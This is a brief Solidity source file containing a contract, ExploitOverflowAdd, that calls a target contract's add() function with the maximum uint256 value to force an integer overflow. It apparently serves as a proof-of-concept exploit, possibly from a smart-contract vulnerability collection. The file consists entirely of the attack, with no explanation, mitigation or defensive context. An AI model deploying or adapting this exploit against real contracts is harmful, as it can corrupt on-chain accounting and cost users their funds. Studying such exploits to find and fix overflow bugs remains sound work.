pragma solidity 0.4.25;

interface IOverflowAdd {
    function add(uint256 deposit) external;
}

contract ExploitOverflowAdd {
    IOverflowAdd public target;

    constructor(address _target) public {
        target = IOverflowAdd(_target);
    }

    function triggerOverflow() public {
        // Maximum uint256 value to cause overflow
        uint256 maxUint = 2**256 - 1;
        target.add(maxUint);
    }
}

